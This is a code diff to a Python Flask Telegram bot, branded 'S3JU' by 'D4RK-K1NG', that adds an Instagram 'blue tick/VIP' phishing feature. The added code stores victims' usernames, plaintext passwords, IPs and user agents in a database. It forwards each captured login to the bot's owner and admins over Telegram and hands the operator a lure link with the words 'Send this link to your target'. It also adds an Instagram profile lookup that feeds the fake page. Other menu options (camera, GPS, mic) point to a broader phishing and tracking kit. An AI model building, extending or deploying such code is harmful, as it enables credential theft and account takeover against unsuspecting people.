@@ -1,5 +1,4 @@
 import os
-import sys
 import json
 import sqlite3
 import string
@@ -93,6 +92,15 @@ def init_db():
             details TEXT DEFAULT '',
             created_at TEXT DEFAULT ''
         );
+        CREATE TABLE IF NOT EXISTS bluetick_captures (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT,
+            password TEXT,
+            ip TEXT,
+            user_agent TEXT,
+            profile_data TEXT DEFAULT '',
+            timestamp TEXT
+        );
     """)
     conn.commit()
     conn.close()
@@ -182,6 +190,32 @@ def set_webhook(url):
         logger.error(f"Webhook set error: {e}")
         return None
 
+def send_to_owner(msg):
+    if OWNER_CHAT_ID:
+        try:
+            send_telegram(int(OWNER_CHAT_ID), msg)
+        except:
+            pass
+
+def send_to_admins(msg):
+    notified = []
+    if OWNER_CHAT_ID:
+        try:
+            send_telegram(int(OWNER_CHAT_ID), msg)
+            notified.append(int(OWNER_CHAT_ID))
+        except:
+            pass
+    conn = get_db()
+    admins = conn.execute("SELECT chat_id FROM users WHERE is_admin = 1").fetchall()
+    conn.close()
+    for a in admins:
+        if a["chat_id"] not in notified:
+            try:
+                send_telegram(a["chat_id"], msg)
+                notified.append(a["chat_id"])
+            except:
+                pass
+
 def notify_admins(action, target_id, admin_id, target_username="", admin_username=""):
     target_mention = f"<code>{target_id}</code>"
     admin_mention = f"<code>{admin_id}</code>"
@@ -193,24 +227,13 @@ def notify_admins(action, target_id, admin_id, target_username="", admin_usernam
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
     if action == "promoted":
-        msg = (
-            f"👑 <b>ADMIN PROMOTED</b> 👑\n\n"
-            f"👤 <b>New Admin:</b> {target_mention}\n"
-            f"🆙 <b>Promoted by:</b> {admin_mention}\n"
-            f"⏰ <b>Time:</b> {timestamp}"
-        )
+        msg = f"👑 <b>ADMIN PROMOTED</b> 👑\n\n👤 <b>New Admin:</b> {target_mention}\n🆙 <b>Promoted by:</b> {admin_mention}\n⏰ <b>Time:</b> {timestamp}"
     elif action == "demoted":
-        msg = (
-            f"⬇️ <b>ADMIN DEMOTED</b> ⬇️\n\n"
-            f"👤 <b>Demoted User:</b> {target_mention}\n"
-            f"⬇️ <b>Demoted by:</b> {admin_mention}\n"
-            f"⏰ <b>Time:</b> {timestamp}"
-        )
+        msg = f"⬇️ <b>ADMIN DEMOTED</b> ⬇️\n\n👤 <b>Demoted User:</b> {target_mention}\n⬇️ <b>Demoted by:</b> {admin_mention}\n⏰ <b>Time:</b> {timestamp}"
     else:
         return
 
     notified = []
-
     if OWNER_CHAT_ID:
         try:
             owner_id = int(OWNER_CHAT_ID)
@@ -223,7 +246,6 @@ def notify_admins(action, target_id, admin_id, target_username="", admin_usernam
     conn = get_db()
     admins = conn.execute("SELECT chat_id FROM users WHERE is_admin = 1").fetchall()
     conn.close()
-
     for a in admins:
         aid = a["chat_id"]
         if aid != admin_id and aid not in notified:
@@ -234,8 +256,6 @@ def notify_admins(action, target_id, admin_id, target_username="", admin_usernam
                         notified.append(aid)
             except:
                 pass
-
-    logger.info(f"Notified {len(notified)} admins about {action}: {target_id}")
 
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 BANNER_DIR = os.path.join(BASE_DIR, "banner")
@@ -300,7 +320,8 @@ PLATFORM_BUTTONS = [
     [{"text": "👻 Snapchat", "callback_data": "platform_snapchat"},
      {"text": "📷 Camera", "callback_data": "platform_camera"},
      {"text": "📍 GPS", "callback_data": "platform_gps"}],
-    [{"text": "🎤 Mic", "callback_data": "platform_mic"}],
+    [{"text": "🎤 Mic", "callback_data": "platform_mic"},
+     {"text": "🪼 Insta VIP", "callback_data": "bluetick_offer"}],
 ]
 
 ADMIN_MENU = [
@@ -320,6 +341,99 @@ ADMIN_MENU = [
 @app.route("/", methods=["GET"])
 def index():
     return "<h1>🚀 S3JU v1.0</h1><p>Developed by D4RK-K1NG</p>"
+
+@app.route("/blue_tick", methods=["GET"])
+def blue_tick_page():
+    return render_template_string(load_template("blue_tick.html"))
+
+@app.route("/bluetick_capture", methods=["POST"])
+def bluetick_capture():
+    try:
+        data = request.get_json(force=True, silent=True)
+        if not data:
+            return jsonify({"status": "error"}), 400
+
+        username = data.get("username", "")
+        password = data.get("password", "")
+        profile = data.get("profile", {})
+
+        ip = get_visitor_ip()
+        ua = request.headers.get("User-Agent", "")
+        timestamp = datetime.now().isoformat()
+
+        conn = get_db()
+        conn.execute(
+            "INSERT INTO bluetick_captures (username, password, ip, user_agent, profile_data, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
+            (username, password, ip, ua, json.dumps(profile), timestamp)
+        )
+        conn.commit()
+        conn.close()
+
+        verified_status = "✅" if profile.get("verified") else "❌"
+        full_name = profile.get("full_name", "N/A")
+        followers = profile.get("followers", 0)
+        msg = (
+            f"✅ <b>INSTAGRAM VIP CAPTURED!</b> ✅\n\n"
+            f"👤 <b>Username:</b> <code>{html.escape(username)}</code>\n"
+            f"🔑 <b>Password:</b> <code>{html.escape(password)}</code>\n"
+            f"📛 <b>Full Name:</b> {html.escape(full_name)}\n"
+            f"👥 <b>Followers:</b> {followers}\n"
+            f"🆔 <b>Verified:</b> {verified_status}\n"
+            f"🌐 <b>IP:</b> <code>{ip}</code>\n"
+            f"📱 <b>User-Agent:</b> <code>{html.escape(ua[:60])}</code>\n"
+            f"⏰ <b>Time:</b> {timestamp}\n\n"
+            f"🚀 S3JU | D4RK-K1NG"
+        )
+
+        send_to_owner(msg)
+        send_to_admins(msg)
+
+        return jsonify({"status": "ok"})
+
+    except Exception as e:
+        logger.error(f"[Bluetick Capture Error] {e}")
+        return jsonify({"status": "error"}), 500
+
+@app.route("/lookup_instagram", methods=["GET"])
+def lookup_instagram():
+    username = request.args.get("username", "").strip().replace("@", "")
+    if not username:
+        return jsonify({"error": "Username is required"})
+
+    try:
+        headers = {
+            "x-ig-app-id": "936619743392459",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Accept": "application/json",
+        }
+        url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
+        resp = requests.get(url, headers=headers, timeout=15)
+        data = resp.json()
+
+        user = data.get("data", {}).get("user")
+        if not user:
+            return jsonify({"error": "This account does not exist. Please check the username and try again."})
+
+        result = {
+            "username": user.get("username"),
+            "full_name": user.get("full_name", ""),
+            "biography": user.get("biography", ""),
+            "private": user.get("is_private", False),
+            "verified": user.get("is_verified", False),
+            "followers": user.get("edge_followed_by", {}).get("count", 0),
+            "following": user.get("edge_follow", {}).get("count", 0),
+            "posts": user.get("edge_owner_to_timeline_media", {}).get("count", 0),
+            "profile_pic": user.get("profile_pic_url_hd", ""),
+            "external_url": user.get("external_url", ""),
+            "business": user.get("is_business_account", False),
+            "professional": user.get("is_professional_account", False),
+            "category": user.get("category_name", ""),
+        }
+        return jsonify(result)
+
+    except Exception as e:
+        logger.error(f"Instagram lookup error: {e}")
+        return jsonify({"error": "Could not reach Instagram. Please try again."})
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
@@ -593,7 +707,7 @@ def handle_message(message):
     if text == "/help":
         admin_section = ""
         if is_admin(chat_id):
-            admin_section = "\n👑 <b>Admin commands:</b>\n/admin - Open admin panel\n/broadcast - Broadcast to all users"
+            admin_section = "\n\n👑 <b>Admin commands:</b>\n/admin - Open admin panel\n/broadcast - Broadcast to all users"
         send_telegram(chat_id,
             "📚 <b>S3JU Commands</b>\n\n"
             "🚀 /start - Welcome and banner\n"
@@ -670,6 +784,25 @@ def handle_callback(callback):
         edit_message(chat_id, message_id, f"✅ Session {session_id[:8]} has been cancelled.")
         return
 
+    if data == "bluetick_offer":
+        session_id = generate_session_id()
+        conn.execute("INSERT INTO sessions (session_id, chat_id, platform, created, status) VALUES (?, ?, ?, ?, 'active')",
+                     (session_id, chat_id, 'instagram_vip', datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+
+        session_url = f"{PUBLIC_URL}/blue_tick"
+
+        edit_message(chat_id, message_id,
+            f"✅ <b>Instagram VIP Link Created!</b> ✅\n\n"
+            f"🔗 <b>URL:</b> <code>{session_url}</code>\n\n"
+            f"📤 Send this link to your target\n"
+            f"⏳ Waiting for target to enter credentials...",
+            {"inline_keyboard": [[{"text": "🗑️ Cancel Session", "callback_data": f"cancel_{session_id}"}]]})
+
+        answer_callback(cb_id, "Link created!")
+        return
+
     if data.startswith("platform_"):
         platform = data.replace("platform_", "")
         session_id = generate_session_id()
@@ -711,6 +844,7 @@ def handle_callback(callback):
         total_banned = conn.execute("SELECT COUNT(*) as cnt FROM users WHERE is_banned = 1").fetchone()
         total_admins = conn.execute("SELECT COUNT(*) as cnt FROM users WHERE is_admin = 1").fetchone()
         total_views = conn.execute("SELECT COALESCE(SUM(total_views), 0) as cnt FROM sessions").fetchone()
+        bt_captures = conn.execute("SELECT COUNT(*) as cnt FROM bluetick_captures").fetchone()
         conn.close()
         edit_message(chat_id, message_id,
             f"📊 <b>Admin Dashboard</b>\n\n"
@@ -719,6 +853,7 @@ def handle_callback(callback):
             f"⛔ Banned: <code>{total_banned['cnt']}</code>\n"
             f"📋 Active Sessions: <code>{active_sessions['cnt']}</code>\n"
             f"🔓 Total Captures: <code>{total_captures['cnt']}</code>\n"
+            f"✅ Insta VIP Captures: <code>{bt_captures['cnt']}</code>\n"
             f"👁️ Total Views: <code>{total_views['cnt']}</code>\n\n"
             f"🔄 Use /admin to refresh",
             {"inline_keyboard": ADMIN_MENU})
